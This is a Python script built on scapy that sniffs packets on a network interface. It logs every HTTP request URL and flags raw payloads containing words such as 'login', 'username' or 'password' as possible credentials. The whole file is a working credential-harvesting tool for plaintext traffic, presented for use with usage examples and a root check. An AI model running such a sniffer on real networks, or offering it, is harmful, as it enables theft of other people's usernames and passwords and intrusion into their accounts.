#!/usr/bin/env python3

from scapy.layers import http   # https://scapy.readthedocs.io/en/latest/api/scapy.layers.http.html

import argparse                 # https://docs.python.org/3/library/argparse.html
import os                       # https://docs.python.org/3/library/os.html
import scapy.all as scapy       # https://scapy.readthedocs.io/en/latest/index.html
import sys                      # https://docs.python.org/3/library/sys.html
import textwrap                 # https://docs.python.org/3/library/textwrap.html


def is_not_root():
    return os.geteuid() != 0


def get_args():
    parser = argparse.ArgumentParser(
        description="Packet sniffer",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """Example: 
            packet_sniffer.py -i eth0
            packet_sniffer.py          # with default eth0
        """
        ),
    )
    parser.add_argument("-i", "--interface", default="eth0", help="interface to use")
    values = parser.parse_args()
    return values


def sniff(interface):
    # scapy.sniff - sniff the packet in the specified interface
    # store=False - do not keep in buffer
    # pwn - is owned or compromised
    # process_sniffed_packet - function to execute
    # filter - uses BPF https://biot.com/capstats/bpf.html
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = [
            "login",
            "LOGIN",
            "Login",
            "user",
            "username",
            "email",
            "e-mail",
            "pass",
            "password",
        ]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())
        login_info = get_login_info(packet)
        if login_info:
            print("\n[+] Possible username/password >> " + login_info + "\n")


if __name__ == "__main__":
    if is_not_root():
        sys.exit("[-] This script requires superuser privileges.")

    options = get_args()
    sniff(options.interface)
